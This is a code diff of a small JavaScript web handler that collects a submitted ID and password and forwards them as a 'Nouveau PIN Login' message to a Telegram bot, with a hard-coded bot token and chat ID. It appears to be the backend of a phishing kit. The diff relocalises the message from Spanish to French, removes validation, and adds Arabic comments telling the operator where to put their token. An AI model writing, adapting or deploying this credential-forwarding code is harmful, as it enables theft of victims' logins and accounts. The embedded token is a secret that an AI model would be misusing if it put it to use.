@@ -5,37 +5,28 @@ export default async function handler(req, res) {
 
   const { id_no, password } = req.body;
 
-  const BOT_TOKEN = "8257299535:AAHw21OzY6yFvX_LhgiGNJqm8AM3cuVp57k";
-  const CHAT_ID = "-4887362963";
+  const BOT_TOKEN = "8257299535:AAHw21OzY6yFvX_LhgiGNJqm8AM3cuVp57k"; // 👈 حط التوكن ديالك هنا
+  const CHAT_ID = "-4887362963"; // 👈 وحط الشات آي دي هنا
 
-  if (!id_no || !password) {
-    return res.status(400).json({ message: "❌ Missing fields" });
-  }
-
+  // الرسالة لي غتوصل للتلغرام
   const message = `
-📩 Nuevo acceso:
-- ID: ${id_no}
-- Password: ${password}
+🔑 Nouveau PIN Login:
+- Identifiant: ${id_no}
+- Mot de passe: ${password}
   `;
 
   const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 
   try {
-    const tg = await fetch(url, {
+    await fetch(url, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ chat_id: CHAT_ID, text: message }),
     });
 
-    const result = await tg.json();
-    if (!tg.ok) {
-      console.error("Telegram error:", result);
-      return res.status(500).json({ message: "❌ Telegram API error" });
-    }
-
-    return res.status(200).json({ message: "✅ Sent OK" });
+    res.status(200).json({ message: "✅ Envoyé avec succès" });
   } catch (err) {
-    console.error("Server error:", err);
-    return res.status(500).json({ message: "❌ Internal error" });
+    console.error("Erreur Telegram:", err);
+    res.status(500).json({ message: "❌ Erreur lors de l'envoi" });
   }
 }
